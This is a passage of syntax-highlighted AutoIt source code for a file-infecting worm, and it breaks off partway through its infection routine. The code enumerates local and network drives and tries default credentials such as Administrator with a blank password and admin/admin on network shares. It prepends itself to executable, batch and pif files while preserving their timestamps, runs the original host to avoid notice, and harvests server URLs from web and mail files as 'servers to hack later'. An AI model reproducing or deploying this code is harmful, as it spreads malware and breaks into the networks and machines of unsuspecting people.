</span><span class="sc5">Func</span><span class="sc0"> IterateThroughDrives</span><span class="sc8">(</span><span class="sc9">$drive_type</span><span class="sc8">)</span><span class="sc1">;go thru all the drives of the spec type</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringLen</span><span class="sc8">(</span><span class="sc9">$drive_type</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc9">$drive_type</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"ALL"</span><span class="sc1">;if none is specified, set it to "all"</span><span class="sc0">
    </span><span class="sc9">$dryve_type</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringUpper</span><span class="sc8">(</span><span class="sc9">$drive_type</span><span class="sc8">)</span><span class="sc1">;make it upper case</span><span class="sc0">
    </span><span class="sc9">$drives</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">DriveGetDrive</span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$drive_type</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc1">;list all drives of that type</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc5">NOT</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if no errors,</span><span class="sc0">
        </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$i</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc9">$drives</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]</span><span class="sc1">;go thru</span><span class="sc0">
            </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringUpper</span><span class="sc8">(</span><span class="sc4">DriveGetType</span><span class="sc8">(</span><span class="sc9">$drives</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">]))</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"NETWORK"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if drv type is netdrive</span><span class="sc0">
                </span><span class="sc9">$md</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> DriveMapAdd</span><span class="sc8">(</span><span class="sc7">"*"</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$drives</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">])</span><span class="sc1">;try to map it to the first free drive letter (returned as $md)</span><span class="sc0">
                </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">2</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">6</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if wrong user or pwd</span><span class="sc0">
                    </span><span class="sc9">$md</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> DriveMapAdd</span><span class="sc8">(</span><span class="sc7">"*"</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$drives</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">],</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc7">"Administrator"</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc8">)</span><span class="sc1">;try accessing it as admin with no pwd</span><span class="sc0">
                    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">2</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">6</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if fails</span><span class="sc0">
                        </span><span class="sc9">$md</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> DriveMapAdd</span><span class="sc8">(</span><span class="sc7">"*"</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$drives</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">],</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc7">"Guest"</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc8">)</span><span class="sc1">;try as guest with no pwd</span><span class="sc0">
                        </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">2</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">6</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if fails</span><span class="sc0">
                            </span><span class="sc9">$md</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> DriveMapAdd</span><span class="sc8">(</span><span class="sc7">"*"</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$drives</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">],</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc7">"admin"</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc7">"admin"</span><span class="sc8">)</span><span class="sc1">;try as admin with pwd: admin</span><span class="sc0">
                        </span><span class="sc5">EndIf</span><span class="sc0">
                    </span><span class="sc5">EndIf</span><span class="sc0">
                </span><span class="sc5">EndIf</span><span class="sc0">
                </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc1">;if drive was mapped</span><span class="sc0">
                    IterateThrough</span><span class="sc8">(</span><span class="sc9">$md</span><span class="sc8">)</span><span class="sc1">;go thru it to infect</span><span class="sc0">
                    DriveMapDel</span><span class="sc8">(</span><span class="sc9">$md</span><span class="sc8">)</span><span class="sc1">;unmap it</span><span class="sc0">
                </span><span class="sc5">EndIf</span><span class="sc0">
            </span><span class="sc5">ElseIf</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringUpper</span><span class="sc8">(</span><span class="sc4">DriveStatus</span><span class="sc8">(</span><span class="sc9">$drives</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">]))</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"READY"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if the drive is not a netdrive (so fixed or remov) and it is ready to be read</span><span class="sc0">
                IterateThrough</span><span class="sc8">(</span><span class="sc9">$drives</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">])</span><span class="sc1">;go thru to infect</span><span class="sc0">
            </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">Next</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> IterateThrough</span><span class="sc8">(</span><span class="sc9">$dir</span><span class="sc8">)</span><span class="sc1">;goes thru the spec folder and subdirs</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc5">Not</span><span class="sc0"> </span><span class="sc4">FileExists</span><span class="sc8">(</span><span class="sc9">$dir</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc1">;if it doesn't exist quit</span><span class="sc0">
    </span><span class="sc9">$search</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileFindFirstFile</span><span class="sc8">(</span><span class="sc9">$dir</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"\*.*"</span><span class="sc8">)</span><span class="sc1">;find first file</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc9">$search</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc1">;if fails ret</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$nProb</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">1.0</span><span class="sc1">;infeciton probability (of exe and scr files only)</span><span class="sc0">
    </span><span class="sc5">While</span><span class="sc0"> True</span><span class="sc1">;we'll exit the loop when we need to</span><span class="sc0">
        </span><span class="sc9">$file</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileFindNextFile</span><span class="sc8">(</span><span class="sc9">$search</span><span class="sc8">)</span><span class="sc1">;find next file</span><span class="sc0">
        </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">ExitLoop</span><span class="sc1">;if no more files are found, quit</span><span class="sc0">
        </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc4">FileGetAttrib</span><span class="sc8">(</span><span class="sc9">$dir</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"\"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$file</span><span class="sc8">),</span><span class="sc7">"D"</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if the spec file is not a folder</span><span class="sc0">
            </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringlower</span><span class="sc8">(</span><span class="sc4">stringright</span><span class="sc8">(</span><span class="sc9">$file</span><span class="sc8">,</span><span class="sc3">3</span><span class="sc8">))</span><span class="sc1">;get file type (first 3 chars from the right)</span><span class="sc0">
            </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"bat"</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"pif"</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"cmd"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;w/e it is a batch or pif file,</span><span class="sc0">
                InfectFile</span><span class="sc8">(</span><span class="sc9">$dir</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"\"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$file</span><span class="sc8">)</span><span class="sc1">;infect it</span><span class="sc0">
            </span><span class="sc5">Elseif</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"exe"</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"scr"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;w/e it is an exe or scr</span><span class="sc0">
                </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$file</span><span class="sc8">,</span><span class="sc7">"setup"</span><span class="sc8">,</span><span class="sc0">false</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$file</span><span class="sc8">,</span><span class="sc7">"inst"</span><span class="sc8">,</span><span class="sc0">false</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$file</span><span class="sc8">,</span><span class="sc7">"patch"</span><span class="sc8">,</span><span class="sc0">false</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$file</span><span class="sc8">,</span><span class="sc7">"fix"</span><span class="sc8">,</span><span class="sc0">false</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc4">Random</span><span class="sc8">(</span><span class="sc3">0</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)&lt;</span><span class="sc9">$nProb</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;check if it is an installer and with some chance,</span><span class="sc0">
                    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> InfectFile</span><span class="sc8">(</span><span class="sc9">$dir</span><span class="sc8">&amp;</span><span class="sc7">"\"</span><span class="sc8">&amp;</span><span class="sc9">$file</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">; infect it and if infected,</span><span class="sc0">
                        </span><span class="sc9">$nProb</span><span class="sc8">*=</span><span class="sc3">0.75</span><span class="sc1">;reduce the infection prob of the exe files in this folder by 1/4</span><span class="sc0">
                    </span><span class="sc5">EndIf</span><span class="sc0">
                </span><span class="sc5">EndIf</span><span class="sc0">
            </span><span class="sc5">ElseIf</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0">  </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"htm"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"tml"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"php"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"asp"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"jsp"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"eml"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"nws"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ftype</span><span class="sc8">=</span><span class="sc7">"txt"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc1">;if the file may contain any web server address in the format http://servernameorip[/],</span><span class="sc0">
                </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$h</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileOpen</span><span class="sc8">(</span><span class="sc9">$dir</span><span class="sc8">&amp;</span><span class="sc7">"\"</span><span class="sc8">&amp;</span><span class="sc9">$file</span><span class="sc8">,</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc1">;open the file in read mode</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$h</span><span class="sc8">&lt;&gt;-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if success</span><span class="sc0">
                    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$fbody</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringreplace</span><span class="sc8">(</span><span class="sc4">FileRead</span><span class="sc8">(</span><span class="sc9">$h</span><span class="sc8">),</span><span class="sc7">"\"</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc1">;read it and rep all "\" with "/"</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc8">=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if success</span><span class="sc0">
                        </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$z</span><span class="sc8">=</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$fbody</span><span class="sc8">)-</span><span class="sc3">6</span><span class="sc1">;go throu all chars</span><span class="sc0">
                            </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$flag</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringlower</span><span class="sc8">(</span><span class="sc4">stringmid</span><span class="sc8">(</span><span class="sc9">$fbody</span><span class="sc8">,</span><span class="sc9">$z</span><span class="sc8">,</span><span class="sc3">7</span><span class="sc8">))</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$flag</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"http://"</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;whenever we find "http://"</span><span class="sc0">
                                </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$newserv</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$flag</span><span class="sc1">;find the serv addr</span><span class="sc0">
                                </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$k</span><span class="sc8">=</span><span class="sc9">$z</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$fbody</span><span class="sc8">)</span><span class="sc0">
                                    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$newc</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringmid</span><span class="sc8">(</span><span class="sc9">$fbody</span><span class="sc8">,</span><span class="sc9">$k</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
                                    </span><span class="sc9">$newserv</span><span class="sc8">&amp;=</span><span class="sc9">$newc</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$newc</span><span class="sc8">=</span><span class="sc7">"/"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$newc</span><span class="sc8">=</span><span class="sc7">" "</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                                        </span><span class="sc9">$z</span><span class="sc8">=</span><span class="sc9">$k</span><span class="sc0">
                                        </span><span class="sc5">ExitLoop</span><span class="sc0">
                                    </span><span class="sc5">Endif</span><span class="sc0">
                                </span><span class="sc5">Next</span><span class="sc0">
                                </span><span class="sc9">$newserv</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringlower</span><span class="sc8">(</span><span class="sc9">$newserv</span><span class="sc8">)</span><span class="sc1">;make it lower case </span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">stringinstr</span><span class="sc8">(</span><span class="sc9">$globalServerList</span><span class="sc8">,</span><span class="sc9">$newserv</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc4">stringinstr</span><span class="sc8">(</span><span class="sc9">$globalCheckedSrvLst</span><span class="sc8">,</span><span class="sc9">$newserv</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if it hasn't already been found</span><span class="sc0">
                                    </span><span class="sc9">$globalServerList</span><span class="sc8">&amp;=</span><span class="sc6">@lf</span><span class="sc8">&amp;</span><span class="sc9">$newserv</span><span class="sc1">;write it to the list of servers to hack later...</span><span class="sc0">
                                </span><span class="sc5">EndIf</span><span class="sc0">
                            </span><span class="sc5">EndIf</span><span class="sc0">
                        </span><span class="sc5">Next</span><span class="sc0">
                    </span><span class="sc5">EndIf</span><span class="sc0">
                </span><span class="sc5">EndIf</span><span class="sc0">
            </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">ElseIf</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc9">$file</span><span class="sc8">&lt;&gt;</span><span class="sc7">".."</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc9">$file</span><span class="sc8">&lt;&gt;</span><span class="sc7">"."</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc6">@OSTYPE</span><span class="sc0"> </span><span class="sc8">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">"WIN32_NT"</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$file</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">"dllcache"</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc1">;if the file is a directory and it is different from ".." and "." and we are not under winnt or the directory isn't "dllcache",</span><span class="sc0">
            IterateThrough</span><span class="sc8">(</span><span class="sc9">$dir</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"\"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$file</span><span class="sc8">)</span><span class="sc1">;go thru it</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">WEnd</span><span class="sc0">
    </span><span class="sc4">FileClose</span><span class="sc8">(</span><span class="sc9">$search</span><span class="sc8">)</span><span class="sc1">;close search handle</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> RunHost</span><span class="sc8">()</span><span class="sc1">;runs the host program with cmdline and in the context of current working dir by extracting it to the temp folder. then returns the body of the worm (empty if host file was not found)</span><span class="sc0">
    </span><span class="sc9">$body</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileRead</span><span class="sc8">(</span><span class="sc0">@AutoItExe</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$n</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$body</span><span class="sc8">,</span><span class="sc7">"[h0st]"</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc9">$n</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
    </span><span class="sc9">$host_body</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringMid</span><span class="sc8">(</span><span class="sc9">$body</span><span class="sc8">,</span><span class="sc9">$n</span><span class="sc8">+</span><span class="sc3">7</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$my_body</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringLeft</span><span class="sc8">(</span><span class="sc9">$body</span><span class="sc8">,</span><span class="sc9">$n</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$host_name</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc6">@TempDir</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"\"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@ScriptName</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">FileExists</span><span class="sc8">(</span><span class="sc9">$host_name</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc4">FileDelete</span><span class="sc8">(</span><span class="sc9">$host_name</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc4">FileWrite</span><span class="sc8">(</span><span class="sc9">$host_name</span><span class="sc8">,</span><span class="sc9">$host_body</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc4">Run</span><span class="sc8">(</span><span class="sc9">$host_name</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$CmdLineRaw</span><span class="sc8">,</span><span class="sc6">@WorkingDir</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Return</span><span class="sc0"> </span><span class="sc9">$my_body</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

    
</span><span class="sc5">Func</span><span class="sc0"> InfectFile</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">)</span><span class="sc1">;infects a file, by prepending itself to it (very noob, but this way we can also infect batch files and pif files)</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc5">Not</span><span class="sc0"> </span><span class="sc4">FileExists</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0"> False
    </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> True
    </span><span class="sc9">$time_modified</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileGetTime</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">,</span><span class="sc3">0</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$time_accessed</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileGetTime</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">,</span><span class="sc3">2</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$host_attributes</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileGetAttrib</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc4">FileSetAttrib</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">,</span><span class="sc7">"-HSR"</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$host_body</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileRead</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$my_body</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileRead</span><span class="sc8">(</span><span class="sc0">@AutoItExe</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$host_body</span><span class="sc8">,</span><span class="sc7">"[h0st]"</span><span class="sc8">,</span><span class="sc0">true</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> 
        </span><span class="sc9">$handle</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">FileOpen</span><span class="sc8">(</span><span class="sc9">$host</span><span class="sc8">,</span><span class="sc3">2</span><span class="sc8">)</span><span class="sc0">
